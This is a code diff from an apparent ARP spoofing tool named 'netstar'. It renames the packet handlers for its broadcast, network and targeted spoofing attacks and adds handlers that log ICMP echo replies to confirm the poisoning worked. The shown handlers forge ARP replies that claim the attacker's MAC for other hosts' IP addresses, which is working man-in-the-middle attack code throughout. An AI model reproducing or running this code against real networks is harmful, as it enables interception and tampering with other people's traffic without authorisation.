@@ -19,13 +19,29 @@ static bool netstar_arp_broadcast_spoofing_initialized;
 
 
 static void
-netstar_arp_spoofing_broadcast_acknowledge(netstar_t *netstar, struct netstar_capture_packet *packet, void *args) {
+netstar_arp_broadcast_spoofing_respond(netstar_t *netstar, struct netstar_capture_packet *packet, void *args) {
   struct netstar_arp_broadcast_spoofing *spoofing_attack = (struct netstar_arp_broadcast_spoofing *)args;
 
   if (netstar_hosts_findipaddr4(spoofing_attack->spoofed_hosts, &packet->layer3.daddr.v4)) {
     netstar_sendicmpecho(&netstar->managed, &netstar->managed.iface->mac, &packet->layer2.smac, NETSTAR_ICMP_TYPE_ECHO, &packet->layer3.daddr.v4, &packet->layer3.saddr.v4);
 
     netstar_sendarp(&netstar->managed, &netstar->managed.iface->mac, &packet->layer2.smac, NETSTAR_ARP_OPCODE_REPLY, &netstar->managed.iface->mac, &packet->layer3.daddr.v4, &packet->layer2.smac, &packet->layer3.saddr.v4);
+  }
+}
+
+static void
+netstar_arp_broadcast_spoofing_confirm(netstar_t *netstar, struct netstar_capture_packet *packet, void *args) {
+  struct netstar_icmphdr *icmph = (struct netstar_icmphdr *)packet->layer3.payload;
+  struct netstar_arp_broadcast_spoofing *spoofing_attack = (struct netstar_arp_broadcast_spoofing *)args;
+
+  if (icmph->type != NETSTAR_ICMP_TYPE_ECHO_REPLY)
+    return;
+
+  if (netstar_hosts_findipaddr4(spoofing_attack->spoofed_hosts, &packet->layer3.daddr.v4)) {
+    char saddr[NETWORK_IPADDR4_STRLENGTH] = {0};
+
+    netstar_log("\b \b[ arp@broadcast-spoofing ]: %s ICMP Echo reply (0x%02" PRIX8 ")\r\n",
+      network_ipaddr4_format(&packet->layer3.saddr.v4, saddr, sizeof(saddr)), NETSTAR_ICMP_TYPE_ECHO_REPLY);
   }
 }
 
@@ -41,8 +57,7 @@ netstar_arp_broadcast_spoofing(void *context) {
 
   netstar_log(
     "\b \b[ arp@broadcast-spoofing ]: spoof-burst-interval: %" PRIu32 "s; "
-                                     "spoof-burst-count: %zu; "
-                                     "spoof-steady-interval: %" PRIu32 "\r\n",
+    "spoof-burst-count: %zu; spoof-steady-interval: %" PRIu32 "\r\n",
     netstar_time_millisecstosecs(spoofing_attack->spoof_burst_interval),
     spoofing_attack->spoof_burst_count,
     netstar_time_millisecstosecs(spoofing_attack->spoof_steady_interval)
@@ -136,7 +151,9 @@ static void
 netstar_arp_broadcast_spoofing_start(void *context) {
   struct netstar_arp_broadcast_spoofing *spoofing_attack = (struct netstar_arp_broadcast_spoofing *)context;
 
-  netstar_forward_add(netstar_arp_spoofing_broadcast_acknowledge, NETSTAR_FORWARD_ARP_REQUEST, spoofing_attack);
+  netstar_forward_add(netstar_arp_broadcast_spoofing_respond, NETSTAR_FORWARD_ARP_REQUEST, spoofing_attack);
+  netstar_forward_add(netstar_arp_broadcast_spoofing_confirm, NETSTAR_FORWARD_ICMPV4, spoofing_attack);
+
   spoofing_attack->thread = netstar_thread_spawn(netstar_arp_broadcast_spoofing, spoofing_attack);
 }
 
@@ -147,7 +164,9 @@ netstar_arp_broadcast_spoofing_stop(void *context) {
   if (!spoofing_attack->thread || spoofing_attack->thread->status == false)
     return;
 
-  netstar_forward_remove(netstar_arp_spoofing_broadcast_acknowledge);
+  netstar_forward_remove(netstar_arp_broadcast_spoofing_respond);
+  netstar_forward_remove(netstar_arp_broadcast_spoofing_confirm);
+
   netstar_thread_kill(spoofing_attack->thread);
 }
 
@@ -169,7 +188,7 @@ static bool netstar_arp_network_spoofing_initialized;
 
 
 static void
-netstar_arp_network_spoofing_acknowledge(netstar_t *netstar, struct netstar_capture_packet *packet, void *args) {
+netstar_arp_network_spoofing_respond(netstar_t *netstar, struct netstar_capture_packet *packet, void *args) {
   struct netstar_arp_network_spoofing *spoofing_attack = (struct netstar_arp_network_spoofing *)args;
 
   if (netstar_hosts_findipaddr4(spoofing_attack->spoofed_hosts, &packet->layer3.daddr.v4)) {
@@ -182,6 +201,22 @@ netstar_arp_network_spoofing_acknowledge(netstar_t *netstar, struct netstar_capt
     netstar_sendicmpecho(&netstar->managed, &netstar->managed.iface->mac, &packet->layer2.dmac, NETSTAR_ICMP_TYPE_ECHO, &packet->layer3.saddr.v4, &packet->layer3.daddr.v4);
 
     netstar_sendarp(&netstar->managed, &netstar->managed.iface->mac, &packet->layer2.dmac, NETSTAR_ARP_OPCODE_REPLY, &netstar->managed.iface->mac, &packet->layer3.saddr.v4, &packet->layer2.dmac, &packet->layer3.daddr.v4);
+  }
+}
+
+static void
+netstar_arp_network_spoofing_confirm(netstar_t *netstar, struct netstar_capture_packet *packet, void *args) {
+  struct netstar_icmphdr *icmph = (struct netstar_icmphdr *)packet->layer3.payload;
+  struct netstar_arp_network_spoofing *spoofing_attack = (struct netstar_arp_network_spoofing *)args;
+
+  if (icmph->type != NETSTAR_ICMP_TYPE_ECHO_REPLY)
+    return;
+
+  if (netstar_hosts_findipaddr4(spoofing_attack->spoofed_hosts, &packet->layer3.daddr.v4)) {
+    char saddr[NETWORK_IPADDR4_STRLENGTH] = {0};
+
+    netstar_log("\b \b[ arp@network-spoofing ]: %s ICMP Echo reply (0x%02" PRIX8 ")\r\n",
+      network_ipaddr4_format(&packet->layer3.saddr.v4, saddr, sizeof(saddr)), NETSTAR_ICMP_TYPE_ECHO_REPLY);
   }
 }
 
@@ -363,7 +398,9 @@ static void
 netstar_arp_network_spoofing_start(void *context) {
   struct netstar_arp_network_spoofing *spoofing_attack = (struct netstar_arp_network_spoofing *)context;
 
-  netstar_forward_add(netstar_arp_network_spoofing_acknowledge, NETSTAR_FORWARD_ARP_REQUEST, spoofing_attack);
+  netstar_forward_add(netstar_arp_network_spoofing_respond, NETSTAR_FORWARD_ARP_REQUEST, spoofing_attack);
+  netstar_forward_add(netstar_arp_network_spoofing_confirm, NETSTAR_FORWARD_ICMP, spoofing_attack);
+
   spoofing_attack->thread = netstar_thread_spawn(netstar_arp_network_spoofing, spoofing_attack);
 }
 
@@ -374,7 +411,9 @@ netstar_arp_network_spoofing_stop(void *context) {
   if (!spoofing_attack->thread || spoofing_attack->thread->status == false)
     return;
 
-  netstar_forward_remove(netstar_arp_network_spoofing_acknowledge);
+  netstar_forward_remove(netstar_arp_network_spoofing_respond);
+  netstar_forward_remove(netstar_arp_network_spoofing_confirm);
+
   netstar_thread_kill(spoofing_attack->thread);
 }
 
@@ -396,7 +435,7 @@ static bool netstar_arp_spoofing_initialized;
 
 
 static void
-netstar_arp_spoofing_acknowledge(netstar_t *netstar, struct netstar_capture_packet *packet, void *args) {
+netstar_arp_spoofing_respond(netstar_t *netstar, struct netstar_capture_packet *packet, void *args) {
   struct netstar_arp_spoofing *spoofing_attack = (struct netstar_arp_spoofing *)args;
 
   if (netstar_hosts_findipaddr4(spoofing_attack->target_hosts, &packet->layer3.saddr.v4)) {
@@ -409,6 +448,22 @@ netstar_arp_spoofing_acknowledge(netstar_t *netstar, struct netstar_capture_pack
     netstar_sendicmpecho(&netstar->managed, &netstar->managed.iface->mac, &packet->layer2.dmac, NETSTAR_ICMP_TYPE_ECHO, &packet->layer3.saddr.v4, &packet->layer3.daddr.v4);
 
     netstar_sendarp(&netstar->managed, &netstar->managed.iface->mac, &packet->layer2.dmac, NETSTAR_ARP_OPCODE_REPLY, &netstar->managed.iface->mac, &packet->layer3.saddr.v4, &packet->layer2.dmac, &packet->layer3.daddr.v4);
+  }
+}
+
+static void
+netstar_arp_spoofing_confirm(netstar_t *netstar, struct netstar_capture_packet *packet, void *args) {
+  struct netstar_icmphdr *icmph = (struct netstar_icmphdr *)packet->layer3.payload;
+  struct netstar_arp_spoofing *spoofing_attack = (struct netstar_arp_spoofing *)args;
+
+  if (icmph->type != NETSTAR_ICMP_TYPE_ECHO_REPLY)
+    return;
+
+  if (netstar_hosts_findipaddr4(spoofing_attack->spoofed_hosts, &packet->layer3.daddr.v4)) {
+    char saddr[NETWORK_IPADDR4_STRLENGTH] = {0};
+
+    netstar_log("\b \b[ arp@spoofing ]: %s ICMP Echo reply (0x%02" PRIX8 ")\r\n",
+      network_ipaddr4_format(&packet->layer3.saddr.v4, saddr, sizeof(saddr)), NETSTAR_ICMP_TYPE_ECHO_REPLY);
   }
 }
 
@@ -560,7 +615,9 @@ static void
 netstar_arp_spoofing_start(void *context) {
   struct netstar_arp_spoofing *spoofing_attack = (struct netstar_arp_spoofing *)context;
 
-  netstar_forward_add(netstar_arp_spoofing_acknowledge, NETSTAR_FORWARD_ARP_REQUEST, spoofing_attack);
+  netstar_forward_add(netstar_arp_spoofing_respond, NETSTAR_FORWARD_ARP_REQUEST, spoofing_attack);
+  netstar_forward_add(netstar_arp_spoofing_confirm, NETSTAR_FORWARD_ICMP, spoofing_attack);
+
   spoofing_attack->thread = netstar_thread_spawn(netstar_arp_spoofing, spoofing_attack);
 }
 
@@ -571,7 +628,9 @@ netstar_arp_spoofing_stop(void *context) {
   if (!spoofing_attack->thread || spoofing_attack->thread->status == false)
     return;
 
-  netstar_forward_remove(netstar_arp_spoofing_acknowledge);
+  netstar_forward_remove(netstar_arp_spoofing_respond);
+  netstar_forward_remove(netstar_arp_spoofing_confirm);
+
   netstar_thread_kill(spoofing_attack->thread);
 }
 
